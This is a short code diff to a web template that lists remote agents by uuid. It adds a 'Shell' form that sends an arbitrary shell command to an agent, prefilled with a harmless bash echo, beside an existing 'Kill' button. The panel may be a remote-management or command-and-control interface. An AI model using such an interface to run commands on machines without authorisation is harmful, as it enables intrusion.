@@ -18,6 +18,10 @@
         <form method="POST" action="{{ url_for("kill_agent", uuid=uuid) }}">
             <input type="submit" value="Kill">
         </form>
+        <form method="POST" action="{{ url_for("processes", uuid=uuid) }}">
+            <input type="text" name="command" value="/bin/bash -c 'echo Hello world'">
+            <input type="submit" value="Shell">
+        </form>
     </div>
 {% endfor %}
 
